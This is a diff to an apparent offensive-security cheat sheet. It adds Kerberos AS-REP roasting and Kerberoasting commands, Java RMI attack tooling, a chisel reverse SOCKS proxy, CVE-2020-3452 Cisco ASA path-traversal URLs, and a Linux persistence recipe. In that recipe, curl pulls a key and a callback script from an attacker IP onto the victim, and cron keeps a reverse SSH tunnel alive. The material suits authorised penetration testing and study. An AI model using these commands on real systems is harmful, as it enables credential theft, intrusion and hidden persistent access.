@@ -45,10 +45,17 @@ $ cat GetNPUsers.out | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
+##### ASREPRoast.ps1
+
+* [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
+
+```
+PS > Get-ASREPHash -Domain megacorp.local -UserName snovvcrash
+```
+
 
 #### Targeted
 
-* [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
 * [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
 
 Given GenericWrite/GenericAll DACL rights over a target, we can modify most of the user’s attributes. We can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))
@@ -87,6 +94,14 @@ PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serv
 ```
 $ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 [-request|-save]
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+```
+
+##### PowerView
+
+* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L2777)
+
+```
+PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
 
 
@@ -3216,7 +3231,6 @@ $ ./spraykatz.py -u snovvcrash -p 'Passw0rd!' -t 10.10.13.37,10.10.13.38,10.10.1
 
 ```
 PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
-PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
 
 
@@ -3680,6 +3694,65 @@ msf > use auxiliary/admin/hp/hp_ilo_create_admin_account
 
 
 
+# Java RMI
+
+
+
+
+## Enumerate
+
+Check if class loader is enabled:
+
+```
+msf > use auxiliary/scanner/misc/java_rmi_server
+```
+
+Dump registry with MSF:
+
+```
+msf > use use auxiliary/gather/java_rmi_registry
+```
+
+Dump registry with Nmap:
+
+```
+$ sudo nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" 10.10.13.37 -p1098
+```
+
+
+
+
+## BaRMIe
+
+* [https://github.com/NickstaDB/BaRMIe](https://github.com/NickstaDB/BaRMIe)
+
+```
+$ java -jar BaRMIe.jar -enum 10.10.13.37 1098
+$ java -jar BaRMIe.jar -attack 10.10.13.37 1098
+```
+
+
+
+
+## remote-method-guesser
+
+* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
+
+```
+$ java -jar rmg-3.0.0-jar-with-dependencies.jar 10.10.13.37 1098 enum
+```
+
+
+
+
+## rmiscout
+
+* [https://github.com/BishopFox/rmiscout](https://github.com/BishopFox/rmiscout)
+
+
+
+
+
 # Kali
 
 
@@ -3946,24 +4019,24 @@ $ nmap -n -Pn -sV --script ldap-brute 127.0.0.1 -p389
 Grep for sensitive keywords:
 
 ```
-$ grep -nir passwd /etc/ 2>/dev/null
+$ grep -nir passw /etc/ 2>/dev/null
 ```
 
 Find and list all files newer than `2020-03-16` and not newer than `2020-03-17`:
 
 ```
-user@vict:$ find / -type f -readable -newermt '2020-03-16' ! -newermt '2020-03-17' -ls 2>/dev/null
+$ find / -type f -readable -newermt '2020-03-16' ! -newermt '2020-03-17' -ls 2>/dev/null
 ```
 
 Find SUID binaries:
 
 ```
  # User
-find / -type f -perm /4000 -ls 2>/dev/null
+$ find / -type f -perm /4000 -ls 2>/dev/null
  # Group
-find / -type f -perm /2000 -ls 2>/dev/null
+$ find / -type f -perm /2000 -ls 2>/dev/null
  # Both
-find / -type f -perm /6000 -ls 2>/dev/null
+$ find / -type f -perm /6000 -ls 2>/dev/null
 ```
 
 
@@ -4729,6 +4802,7 @@ Check:
 $ host facebook.com ns.example.com
 $ dig +short @ns.example.com test.openresolver.com TXT
 $ sudo nmap -Pn -sU -sV --script dns-recursion ns.example.com -p53
+msf > auxiliary/scanner/dns/dns_amp
 ```
 
 
@@ -5204,6 +5278,49 @@ Stager encryption is the same as for Ruler/Forms.
 
 
 
+# Persistence
+
+
+
+
+## Linux
+
+
+
+### SSH Tunnel in Crontab
+
+```bash
+#!/bin/bash
+if [[ `ps -ef | grep -c 2222` -eq 1 ]]; then
+  /usr/bin/ssh -nNT -R 2222:localhost:22 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /home/alice/.ssh/.k nopty@10.10.13.37
+fi
+```
+
+Attacker's box
+
+```
+$ sudo useradd -ms /bin/false nopty
+$ sudo ssh-keygen -f /home/nopty/.ssh/dummy_key -t ed25519 -q -N ""
+$ cat /home/nopty/.ssh/dummy_key.pub
+$ sudo vi /home/nopty/.ssh/authorized_keys
+from="10.10.13.38",command="echo 'Only port forwarding is allowed'",no-agent-forwarding,no-X11-forwarding,no-pty <DUMMY_KEY_PUB>
+```
+
+Victim's box:
+
+```
+$ curl 10.10.13.37/dummy_key > /home/alice/.ssh/.k
+$ chmod 600 /home/alice/.ssh/.k
+$ curl 10.10.13.37/callback.sh > /home/alice/.conf
+$ chmod +x /home/alice/.conf
+$ crontab -e
+*/15 * * * * /home/alice/.conf
+```
+
+
+
+
+
 # Pivoting
 
 * [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
@@ -5359,8 +5476,8 @@ root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 Socks5 proxy with Chisel in client mode:
 
 ```
-root@kali:$ ./chisel server -p 8000 --reverse --socks5 [--fingerprint <BASE64_STRING>]
-alice@victim:$ ./chisel client 10.10.13.37:8000 R:socks [--auth snovvcrash:'Passw0rd!']
+root@kali:$ ./chisel server -p 8000 --reverse --socks5 [--auth snovvcrash:'Passw0rd!']
+alice@victim:$ ./chisel client [--fingerprint <BASE64_STRING>] [--auth snovvcrash:'Passw0rd!'] 10.10.13.37:8000 R:socks
 ```
 
 
@@ -6189,7 +6306,7 @@ $ shellpop -H 10.10.13.37 -P 9001 --reverse --number 8 --base64
 
 # SMB
 
-Check for SMB vulnerablities with Nmap NSE:
+Check for SMB vulnerablities with Nmap:
 
 ```
 $ sudo nmap -sV --script-args=unsafe=1 --script smb-os-discovery 10.10.13.37 -p139,445
@@ -6323,7 +6440,7 @@ $ snmp-check -v 2c -c public 10.10.13.37
 
 # TFTP
 
-Enum with Nmap NSE:
+Enum with Nmap:
 
 ```
 $ sudo nmap -sVU -p69 --script tftp-enum 10.10.13.37
@@ -7937,6 +8054,15 @@ $ nikto -h http://127.0.0.1 -Cgidirs all
 ### ASA Path Traversal
 
 **CVE-2020-3452**
+
+Check manually:
+
+```
+https://cisco.example.com/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+https://cisco.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+```
+
+Check with MSF:
 
 ```
 msf > use auxiliary/scanner/http/cisco_directory_traversal
